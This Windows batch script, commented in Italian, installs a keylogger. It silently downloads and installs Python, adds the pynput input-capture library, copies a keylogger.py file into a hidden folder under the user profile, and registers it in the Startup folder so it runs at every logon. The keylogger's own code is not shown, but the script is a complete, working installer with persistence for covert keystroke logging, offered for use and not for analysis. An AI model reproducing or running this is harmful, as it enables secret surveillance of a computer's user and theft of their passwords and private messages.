@echo off

REM Directory di installazione di Python per l'utente
set "PYTHON_INSTALL_DIR=%LOCALAPPDATA%\Python\Python312"

REM Controlla se Python è installato
if exist "%PYTHON_INSTALL_DIR%\python.exe" (
    echo Python è già installato.
) else (
    echo Python non è installato. Installazione in corso...

    REM Scarica l'installer di Python
    echo Download dell'installer di Python...
    powershell -command "Invoke-WebRequest -Uri https://www.python.org/ftp/python/3.12.4/python-3.12.4-amd64.exe -OutFile python_installer.exe"

    REM Esegui l'installer in modalità silenziosa nella directory dell'utente
    echo Installazione di Python in corso...
    start /wait python_installer.exe /quiet InstallAllUsers=0 PrependPath=0 TargetDir="%PYTHON_INSTALL_DIR%" Include_test=0

    REM Elimina l'installer
    del python_installer.exe
)

REM Aggiorna pip alla versione più recente
echo Aggiornamento di pip...
"%PYTHON_INSTALL_DIR%\python.exe" -m ensurepip
"%PYTHON_INSTALL_DIR%\python.exe" -m pip install --upgrade pip

REM Installa pynput utilizzando pip
echo Installazione di pynput...
"%PYTHON_INSTALL_DIR%\python.exe" -m pip install pynput

REM Crea la directory di destinazione per il file keylogger
set "KEYLOGGER_DIR=%LOCALAPPDATA%\keylogger"
mkdir "%KEYLOGGER_DIR%"

REM Copia del programma Python nella directory di destinazione
echo Copia del programma Python in corso...
xcopy /y "%~dp0keylogger.py" "%KEYLOGGER_DIR%\" >nul

REM Aggiunge il programma all'avvio dell'utente
echo Aggiunta del programma all'avvio...
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
echo @echo off > "%STARTUP_DIR%\keylogger_start.bat"
echo "%PYTHON_INSTALL_DIR%\python.exe" "%KEYLOGGER_DIR%\keylogger.py" >> "%STARTUP_DIR%\keylogger_start.bat"

echo Installazione completata con successo!
exit
